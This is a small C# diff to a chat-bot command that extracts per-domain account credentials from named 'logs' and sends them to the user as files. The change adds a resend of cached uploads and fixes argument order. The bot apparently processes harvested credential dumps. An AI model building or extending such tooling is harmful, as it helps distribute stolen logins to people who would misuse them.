@@ -20,6 +20,9 @@ public class AccountsCommand(Client client, DataService data, ParsingConfig cfgP
         if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not {} logsname)
             return;
         
+        if (await data.TrySendUploadedAsync(user, logsname, "Accounts"))
+            return;
+        
         if (data.GetExtractedPath(logsname) is not {} path)
             return;
 
@@ -31,6 +34,6 @@ public class AccountsCommand(Client client, DataService data, ParsingConfig cfgP
         foreach (var (domain, credentials) in accounts)
             files.Add(await data.SaveAsync(domain, credentials.Select(x => x.ToStringShort()), $"Accounts/{logsname}"));
 
-        await data.SendFilesAsync(user, files, "Accounts", logsname);
+        await data.SendFilesAsync(user, files, logsname, "Accounts");
     }
 }
